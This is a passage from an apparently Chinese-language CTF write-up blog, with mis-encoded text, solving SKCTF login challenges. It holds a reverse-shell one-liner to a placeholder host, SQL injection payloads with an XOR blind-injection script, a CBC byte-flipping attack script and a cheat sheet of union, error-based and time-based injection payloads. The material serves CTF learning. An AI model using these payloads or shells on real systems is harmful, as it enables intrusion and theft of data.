class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>);</span><br></pre></td></tr></table></figure><p><strong>PSï¼šé¢˜ç›®ç»™å‡ºäº†å¯†æ–‡</strong></p><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šunion_md5()ã€å‘½ä»¤æ‰§è¡Œåå¼¹shell</strong></p><p>åœ¨å“åº”å¤´ä¸­å‘ç°Hintï¼š</p><p><img src="https://i.loli.net/2019/09/03/I4aGoQj7XtukmH9.png" alt="Snipaste_2019-09-03_08-28-47.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ è¯­å¥ï¼š<code>submit=Login&amp;username=admin&#39; union select 1,md5(1)#&amp;password=1</code></p><p>ç„¶åè¿›å…¥å‘½ä»¤æ‰§è¡Œé¡µé¢ï¼Œè¾“å…¥åå¼¹shellè¯­å¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> VPSï¼š</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> å‘½ä»¤æ‰§è¡Œç‚¹ï¼š</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šå„ç§è¿‡æ»¤ã€å¼‚æˆ–ç›²æ³¨</strong></p><p>äººå·¥fuzzï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€é€—å·ã€andã€orã€â€“+ã€unionã€‚</p><h3 id="ç©ºæ ¼è¢«è¿‡æ»¤"><a href="#ç©ºæ ¼è¢«è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¢«è¿‡æ»¤"></a>ç©ºæ ¼è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">%0a</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°å¯ä»¥ç”¨æ‹¬å·ï¼Œå¦å¤–éœ€è¦æ³¨æ„orè¢«è¿‡æ»¤ï¼Œè¿™è¡¨ç¤ºinf<strong>or</strong>mation_schemaå·²ç»ä¸èƒ½ç”¨äº†ï¼Œæœ€é‡è¦çš„æ˜¯æˆ‘ä»¬ä¸èƒ½ç”¨ substr(â€œpayloadâ€ from f<strong>or</strong>)æ¥æˆªå–å­—ç¬¦ä¸²äº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°<code>ascii()</code>å‡½æ•°çš„ä¸€ä¸ªç‰¹æ€§ï¼š<code>ascii()</code><strong>åœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶ä¼šè¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç </strong>ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½fuzzå‡ºæ¯ä¸€ä¸ªå­—ç¬¦ã€‚</p><p>åœ¨ç¼–å†™è„šæœ¬å‰å…ˆè§‚å¯Ÿé¡µé¢å›æ˜¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(0)^1#</span><br><span class="line">&amp;password&#x3D;123456</span><br><span class="line">&amp;submit&#x3D;Log In</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiteM.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(1)^1#</span><br><span class="line">&amp;password&#x3D;123456</span><br><span class="line">&amp;submit&#x3D;Log In</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiZht.png" alt=""></p><p>è§‚å¯Ÿå‘ç°è¯­å¥ä¸ºå‡è¿”å›<code>password error!</code>ï¼Œè¯­å¥ä¸ºçœŸæ—¶è¿”å›<code>username does not exist!</code></p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">å…³é”®åœ¨äºï¼šå¼‚æˆ–åˆ¤æ–­ &amp; ascii()å¤„ç†å­—ç¬¦ä¸²è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">character = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">url = <span class="string">"http://123.206.31.85:49167/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        payload = <span class="string">"(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)"</span> % (i, ord(c))</span><br><span class="line">        username = <span class="string">"admin'^(%s)^1#"</span> % payload  <span class="comment"># 1=&gt;username does not exist!  0=&gt;password error!</span></span><br><span class="line">        password = <span class="number">123456</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username does not exist!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h2 id="login4-SKCTF"><a href="#login4-SKCTF" class="headerlink" title="login4(SKCTF)"></a>login4(SKCTF)</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šCBCå­—èŠ‚ç¿»è½¬æ”»å‡»_è„šæœ¬ç¼–å†™</strong></p><p> ä¹‹å‰ä¸€ç›´ä»¥ä¸ºå¾ˆéš¾æ‡‚ï¼ŒåŸæ¥åªæ˜¯åˆ†ç»„å¯†ç é‡Œçš„å¯†æ–‡é“¾æ¥æ¨¡å¼2333ã€‚</p><h3 id="CBCåŠ è§£å¯†æµç¨‹"><a href="#CBCåŠ è§£å¯†æµç¨‹" class="headerlink" title="CBCåŠ è§£å¯†æµç¨‹"></a>CBCåŠ è§£å¯†æµç¨‹</h3><p>åŠ å¯†çš„æ­¥éª¤ç®€å•æ¥è¯´ï¼Œé¦–å…ˆæŠŠæ˜æ–‡åˆ†ç»„(é€šå¸¸16å­—èŠ‚ä¸€ç»„)ï¼Œç„¶åä¸ä¸Šä¸€ç»„çš„å¯†æ–‡å¼‚æˆ–ï¼Œå†ç”¨å¯†é’¥åŠ å¯†è¾“å‡ºå³å¯ã€‚</p><p>è¿™é‡Œæ³¨æ„ç¬¬ä¸€ç»„ç”¨åˆå§‹å‘é‡å¼‚æˆ–ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/6949366-5e79b4a4e6495c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601" alt=""></p><p>å¯¹åº”çš„è§£å¯†æ­¥éª¤ï¼ŒæŠŠå¯†æ–‡åˆ†ç»„ï¼Œå…ˆç”¨å¯†é’¥è§£å¯†ï¼Œå†ä¸ä¸Šä¸€ç»„å¯†æ–‡å¼‚æˆ–å¾—åˆ°æ˜æ–‡ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/6949366-d69c0869465af6de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601" alt=""></p><h3 id="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»"><a href="#CBCå­—èŠ‚ç¿»è½¬æ”»å‡»" class="headerlink" title="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»"></a>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</h3><p>è¿™ç±»é¢˜ç›®ä¸€èˆ¬åˆå§‹å‘é‡IVå’ŒåŠ å¯†çš„å¯†æ–‡å¯æ§ï¼Œç„¶åé¢˜ç›®å®ç°ä¸€ä¸ªåŠ å¯†å’Œè§£å¯†çš„è¿‡ç¨‹ï¼Œè¦æ±‚è§£å¯†åçš„æ˜æ–‡æœ‰æŒ‡å®šçš„å†…å®¹ã€‚(å½“ç„¶ä¸€å¼€å§‹æ˜¯æ²¡æœ‰çš„)</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" Î¿nfÎ¿cus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" Î¿nfÎ¿cus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚usernameä¸ºadminï¼Œä½†æ˜¯åˆä¸èƒ½è¾“å…¥adminï¼Œè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">source_plain = decrypt(cypher, key) ^ pr_cypher</span></span><br><span class="line"><span class="string">target_plain = decrypt(cypher, key) ^ new_pr_cypher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">decrypt(cypher, key) = source_plain ^ pr_cypher</span></span><br><span class="line"><span class="string">decrypt(cypher, key) = targer_plain ^ new_pr_cypher</span></span><br><span class="line"><span class="string">source_plain ^ pr_cypher = targer_plain ^ new_pr_cypher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*** new_pr_cypher = souce_plain ^ target_plain ^ pr_cypher ***</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># POSTï¼šusername=zdmin&amp;password=12345</span></span><br><span class="line"><span class="comment"># s:2:&#123;s:8:"userna</span></span><br><span class="line"><span class="comment"># me";s:5:"zdmin"; # ç¬¬2ç»„ ç¬¬10å­—èŠ‚</span></span><br><span class="line"><span class="comment"># s:8:"password";s</span></span><br><span class="line"><span class="comment"># :3:"12345";&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ”¹ä¸Šä¸€ç»„çš„å¯†æ–‡ï¼Œæ§åˆ¶æœ¬ç»„æ˜æ–‡è¾“å‡º</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cypher_payload</span><span class="params">()</span>:</span></span><br><span class="line">    cypher = <span class="string">'ZAF4kXCUawL7i4ofBhE%2Bi5GTeMY4aHhzY8x%2FQKy%2FDdI5nJK6gHXbOMugUFTL6pG7gQBNvtsT6o0nq6Pd3MQeuw%3D%3D'</span>  <span class="comment"># å¡«å†™ç¬¬ä¸€æ¬¡æäº¤è·å¾—çš„å¯†æ–‡</span></span><br><span class="line">    cypher = base64.b64decode(urllib.unquote(cypher))</span><br><span class="line">    new_cypher = cypher[<span class="number">0</span>:<span class="number">9</span>] + chr(ord(<span class="string">'a'</span>) ^ ord(<span class="string">'z'</span>) ^ ord(cypher[<span class="number">9</span>])) + cypher[<span class="number">10</span>:]</span><br><span class="line">    new_cypher = urllib.quote(base64.b64encode(new_cypher))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"new_cypher:"</span> + new_cypher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ”¹åˆå§‹å‘é‡(ä¸Šä¸€ç»„çš„ä¸Šä¸€ç»„)ï¼Œä¿æŒä¸Šä¸€ç»„è§£å¯†åæ˜æ–‡ä¸å˜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iv_payload</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'+BHIbc7b6bOgCeaqeTLFQm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ=='</span>  <span class="comment"># å¡«å†™æäº¤åæ‰€å¾—çš„æ— æ³•ååºåˆ—åŒ–çš„æ˜æ–‡</span></span><br><span class="line">    iv = <span class="string">'WGg7JCcty4UxRBR9L3EVEw%3D%3D'</span>  <span class="comment"># å¡«å†™ç¬¬ä¸€æ¬¡æäº¤è·å¾—çš„åˆå§‹å‘é‡</span></span><br><span class="line">    <span class="comment"># cipher = urllib.unquote(cipher)</span></span><br><span class="line">    cipher = base64.b64decode(cipher)</span><br><span class="line">    iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">    right = <span class="string">'a:2:&#123;s:8:"userna'</span>  <span class="comment"># è¢«ç ´åçš„åˆ†ç»„</span></span><br><span class="line">    newIv = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        newIv += chr(ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i]))  <span class="comment"># è¿™ä¸€æ­¥ç›¸å½“äºæŠŠåŸæ¥ivä¸­ä¸åŒ¹é…çš„éƒ¨åˆ†ä¿®æ”¹è¿‡æ¥</span></span><br><span class="line">    <span class="keyword">print</span> urllib.quote(base64.b64encode(newIv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆèµ°ç¬¬ä¸€ä¸ªå‡½æ•°æ„é€ ä¸Šä¸€ç»„çš„å¯†æ–‡ï¼Œå†èµ°ç¬¬äºŒä¸ªå‡½æ•°æ„é€ ä¸Šä¸€ç»„çš„ä¸Šä¸€ç»„çš„å¯†æ–‡(æœ¬é¢˜çš„åˆå§‹åŒ–å‘é‡)</span></span><br><span class="line">cypher_payload()</span><br><span class="line">iv_payload()</span><br></pre></td></tr></table></figure><p>ä¸å¤šè§£é‡Šäº†ï¼Œè„šæœ¬å†™å¾—å¾ˆæ¸…æ¥šã€‚</p><p>å…ˆè·å–zdminåŠ å¯†åçš„å¯†æ–‡å’Œåˆå§‹å‘é‡IVï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiHwL.png" alt=""></p><p>åˆ©ç”¨è„šæœ¬è·å–new_cipherä½¿å…¶è§£å¯†åzdminå˜ä¸ºadminï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpirAW.png" alt=""></p><p>å¡«å…¥new_cipherï¼Œè·å–è¿”å›çš„å› ä¸ºç¬¬ä¸€ç»„è¢«ç ´åè€Œæ— æ³•ååºåˆ—åŒ–çš„æ˜æ–‡ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpi5Fw.png" alt=""></p><p>åˆ©ç”¨è„šæœ¬è·å–new_ivï¼Œä½¿è¢«ä¿®æ”¹çš„ç¬¬ä¸€ç»„å¯†æ–‡æ­£å¸¸è§£å¯†ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiAJR.png" alt=""></p><p>å‘cookieä¸­æ·»åŠ new_ivå’Œnew_cipherè·å–flagã€‚</p><p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiM48.png" alt=""></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼šå˜é‡è¦†ç›–</strong></p><p>è¿™é‡Œæˆ‘è€æ˜¯å¿˜è®°ï¼Œ$b = file_get_contents($_GET[â€˜aâ€™])ï¼Œå½“a=php://inputï¼Œç„¶åpostä¼ 1ï¼Œ$bå°±ä¼šç­‰äº1ã€‚</p><h2 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h2><h3 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥åº“å---(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line"></span><br><span class="line">æŸ¥è¡¨å---(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;schema_name&#39;)</span><br><span class="line"></span><br><span class="line">æŸ¥å­—æ®µ---(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;table_name&#39;)</span><br><span class="line"></span><br><span class="line">æŸ¥flag--- (select column_name from table_name)</span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šè¶…è¿‡ä¸€è¡Œæ—¶ç”¨ <code>payload LIMIT 0,1</code>é€ä¸ªæŸ¥è¯¢</strong></p><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and case when substring((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> %d <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'%s'</span>  <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><h4 id="å¸ƒå°”ç›²æ³¨"><a 